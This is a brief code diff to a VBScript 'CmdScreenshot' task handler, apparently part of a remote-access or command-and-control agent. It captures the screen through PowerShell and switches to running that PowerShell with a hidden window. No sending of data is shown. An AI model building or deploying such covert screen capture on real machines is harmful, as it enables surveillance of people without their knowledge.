@@ -580,16 +580,9 @@ Function CmdScreenshot(taskParams)
         "$g.Dispose();" & _
         "$bmp.Save('" & tempPath & "',[System.Drawing.Imaging.ImageFormat]::Png);" & _
         "$bmp.Dispose()"""
-    Set exec = oShell.Exec(psCmd)
-    Do While exec.Status = 0
-        WScript.Sleep 100
-    Loop
+    oShell.Run psCmd, 0, True
     If Not oFSO.FileExists(tempPath) Then
-        stderr = ""
-        Do While Not exec.StdErr.AtEndOfStream
-            stderr = stderr & exec.StdErr.ReadLine() & vbLf
-        Loop
-        CmdScreenshot = "screenshot failed: " & stderr
+        CmdScreenshot = "screenshot failed: PowerShell did not produce output file"
         Exit Function
     End If
     Dim rs : Set rs = CreateObject("ADODB.Stream")
